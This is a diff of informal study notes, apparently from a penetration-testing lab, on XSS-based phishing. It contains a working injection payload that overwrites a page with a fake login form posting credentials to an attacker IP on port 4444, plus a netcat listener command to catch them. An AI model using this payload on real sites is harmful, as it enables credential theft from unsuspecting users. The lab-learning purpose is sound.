@@ -1,5 +1,11 @@
 
 
+once faced with the webpage and before testing XSS discovery -> 
+Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.
+
+Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.
+
+
 <h3>Please login to continue</h3>
 <form action=http://10.10.15.252:4444>
     <input type="username" name="username" placeholder="Username">
@@ -10,12 +16,15 @@
 
 
 
-'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.252:4444><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
+'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.252:4444><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--    
+
+
+^^^ this creates the fake login page from the input form. 
 
 
 The second script it the HTML lines turned into XSS showing a fake login page for phishing. 
 
-
+now open up a nc -nlvp 4444 so we dont get a "web page unavailable" 
 
         THIS IS ACTUALLY THE STIP NOT PWNIP 
 
